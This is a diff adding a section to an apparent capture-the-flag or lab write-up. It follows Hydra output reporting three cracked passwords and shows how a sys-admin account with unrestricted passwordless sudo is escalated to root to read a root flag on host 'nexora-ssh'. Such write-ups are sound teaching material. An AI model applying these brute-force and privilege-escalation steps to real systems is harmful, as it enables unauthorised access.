@@ -573,3 +573,36 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-07 01:33:
 1 of 1 target successfully completed, 3 valid passwords found
 </PRE>
 
+###### Sys-Admin, Elevate to root
+- Step 1: Switch the user from net-admin to sys-admin
+```bash
+su sys-admin
+```
+- Step 2: Check what sudo privileges the sys-admin has
+```bash
+sudo -l
+```
+<PRE>
+Matching Defaults entries for sys-admin on nexora-ssh:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User sys-admin may run the following commands on nexora-ssh:
+    (ALL) NOPASSWD: ALL
+</PRE>
+- Step 3: Use sudo to switch users to root.
+```bash
+sudo su
+```
+- Step 4: Confirm the switch to the root user.
+```bash
+id
+```
+<PRE>
+uid=0(root) gid=0(root) groups=0(root)  
+</PRE>
+
+- Step 5: Obtain the root flag.
+```bash
+cat /root/rootFlag.txt
+```
